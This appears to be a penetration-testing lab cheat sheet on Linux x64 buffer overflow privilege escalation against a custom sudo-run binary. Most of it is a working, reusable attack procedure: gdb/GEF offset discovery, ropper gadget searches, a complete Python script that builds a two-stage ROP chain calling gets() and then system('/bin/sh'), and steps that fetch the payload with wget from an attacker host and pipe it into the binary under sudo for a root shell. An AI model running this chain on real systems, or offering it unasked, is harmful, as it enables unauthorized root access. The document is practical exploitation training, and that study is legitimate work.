title: Linux x64 Buffer Overflow — Custom Sudo Binary / ROP
body:
Linux x64 BOF is fundamentally different from Windows x86. The stack is non-executable (NX) so you can't jump to shellcode — instead you chain existing code snippets (gadgets) to call system functions. This is Return Oriented Programming (ROP). The good news: lab boxes with this pattern are usually simple two-stage chains: write /bin/sh somewhere writable → call system() with it. The hard part is finding the offset and gadgets.

This pattern shows up when: sudo -l reveals a custom binary running as root, strings shows it uses gets() or strcpy() (unbounded input), and checksec shows NX enabled but no PIE and no canary. That combination = ROP chain privesc.

Tools needed on Kali: gdb with GEF plugin, ropper, python3 with pwntools or struct.
cmd:
# ══════════════════════════════════════════════════
# STEP 1 — DISCOVER THE BINARY (on target)
# ══════════════════════════════════════════════════
sudo -l                              # look for custom binary with NOPASSWD
ls /usr/local/bin/ /opt/             # custom binaries live here
cat ~/notes.txt                      # devs sometimes hint at what's installed

# Run the binary and observe behavior:
/usr/local/bin/<binary>
# Does it ask for input? Does it call a system command?
# Test overflow immediately:
python3 -c 'print("A"*400)' | sudo /usr/local/bin/<binary>
# Segfault = overflow confirmed

# ══════════════════════════════════════════════════
# STEP 2 — TRANSFER BINARY TO KALI FOR ANALYSIS
# ══════════════════════════════════════════════════
# From Kali:
scp <user>@$ip:/usr/local/bin/<binary> .
# Or from target shell:
# python3 -m http.server 9999
# Then on Kali: wget http://$ip:9999/<binary>

# ══════════════════════════════════════════════════
# STEP 3 — STATIC ANALYSIS
# ══════════════════════════════════════════════════
file <binary>              # ELF 64-bit? stripped?
strings <binary>           # hardcoded passwords, /bin commands, interesting strings
                           # Blackgate: found auth key ClimbingParrotKickingDonkey321 at 0x402030
                           # look for: /bin/sh, /bin/bash, system, gets, strcpy

# Check protections:
gdb -q <binary>
gef> checksec
# What you want to see for ROP to work:
# Canary   : NO   (no stack cookie — won't detect overflow)
# NX       : YES  (stack not executable — need ROP, can't use shellcode)
# PIE      : NO   (addresses are fixed — gadgets at predictable locations)
# If PIE is YES: much harder, need info leak first

# List functions:
gef> info functions
# Look for: gets, strcpy (vulnerable), system (call target), puts
# Unstripped binary = function names visible = easier

# Disassemble main:
gef> disas main
# Find the gets() call and the buffer it writes to:
# lea rax, [rbp-0x100]   ← buffer is 0x100 (256) bytes below rbp
# mov rdi, rax
# call gets             ← unbounded input = overflow
# offset = 0x100 + 0x8 (saved rbp) = 0x108 = 264

# ══════════════════════════════════════════════════
# STEP 4 — FIND EXACT OFFSET
# ══════════════════════════════════════════════════
gef> pattern create 400
# Copy the output pattern
gef> run
# Paste the pattern when prompted for input
# Program crashes with SIGSEGV

# Method A — pattern search (easier):
gef> x/s $rsp
# Shows what's at the stack pointer after crash
gef> pattern search <paste rsp string here>
# [+] Found at offset 264

# Method B — calculate from disassembly:
# buffer offset from rbp (e.g. 0x100) + 8 bytes (saved rbp) = offset to return addr
# 0x100 = 256, 256 + 8 = 264

# ══════════════════════════════════════════════════
# STEP 5 — FIND GADGETS
# ══════════════════════════════════════════════════
# Need: pop rdi; ret   (loads first argument for function calls in x64)
ropper --file <binary> --search 'pop rdi; ret'
# 0x00000000004012e3: pop rdi; ret;
# Note the address

# Also need a writable section to store /bin/sh:
readelf -S <binary> | grep -E 'bss|data'
# .bss section: WA flag = writable, use address + 0x400 offset
# e.g. bss at 0x404050 → use 0x404450

# ══════════════════════════════════════════════════
# STEP 6 — BUILD THE ROP CHAIN
# ══════════════════════════════════════════════════
# Two-stage chain (Blackgate pattern):
# Stage 1: call gets() → write /bin/sh to writable memory
# Stage 2: call system() with pointer to /bin/sh → root shell

cat > exploit.py << 'EOF'
from struct import pack

def p64(x):
    return pack('<Q', x)   # little-endian 64-bit

# ── Addresses (get from your analysis) ──────────────
offset   = 264             # bytes to reach return address
pop_rdi  = 0x4012e3       # pop rdi; ret gadget
bss_addr = 0x404450       # writable .bss + 0x400 offset
gets_plt = 0x4010d0       # gets() PLT address (from: gef> p gets)
system_plt = 0x4010a0     # system() PLT address (from: gef> p system)

# ── Stage 1: write /bin/sh into bss ────────────────
payload  = b"A" * offset  # padding to overflow
payload += p64(pop_rdi)   # gadget: pop rdi; ret
payload += p64(bss_addr)  # rdi = address to write to
payload += p64(gets_plt)  # call gets(bss_addr) — reads our /bin/sh input

# ── Stage 2: call system("/bin/sh") ────────────────
payload += p64(pop_rdi)   # gadget: pop rdi; ret
payload += p64(bss_addr)  # rdi = pointer to "/bin/sh"
payload += p64(system_plt)# call system("/bin/sh")

with open('xploit.txt', 'wb') as f:
    f.write(payload)

print('[+] xploit.txt written')
EOF

python3 exploit.py
# Produces xploit.txt — binary ROP chain

# ══════════════════════════════════════════════════
# STEP 7 — DELIVER ON TARGET
# ══════════════════════════════════════════════════
# Transfer xploit.txt to target:
wget http://<lhost>:8001/xploit.txt

# Run — pipe technique sends binary payload then keeps stdin open:
(cat xploit.txt; cat -) | sudo /usr/local/bin/<binary>
# Binary reads xploit.txt as its input → overflow → ROP chain fires
# When prompted (Stage 1 calls gets() again), type:
/bin/sh
# Then: system("/bin/sh") runs → shell spawns
# Type id, whoami to confirm root
# Then /bin/bash for full shell

# ══════════════════════════════════════════════════
# QUICK REFERENCE — GDB COMMANDS
# ══════════════════════════════════════════════════
# gef> checksec                    check protections
# gef> info functions              list all functions
# gef> disas main                  disassemble main
# gef> p gets                      print PLT address of gets
# gef> p system                    print PLT address of system
# gef> x/s $rsp                    read string at stack pointer
# gef> x/s 0x404450               read string at address
# gef> pattern create 400          generate cyclic pattern
# gef> pattern search <str>        find offset of pattern
# gef> run                         run the binary
# gef> continue (c)                continue after pause
# gef> attach <pid>                attach to running process
warn: Offset calculation: buffer_size_from_disassembly + 8 = offset to return address. 0x100 hex = 256 decimal, +8 = 264. If PIE is enabled, all addresses randomize at runtime and the chain above won't work without an info leak — skip to PwnKit or another vector. The (cat xploit.txt; cat -) pipe keeps stdin open after sending the binary payload — without the cat - part the process closes immediately before stage 2 fires. Always confirm /bin/sh was written (stage 1) before stage 2 executes: gef> x/s <bss_addr> should show '/bin/sh' after pattern search.
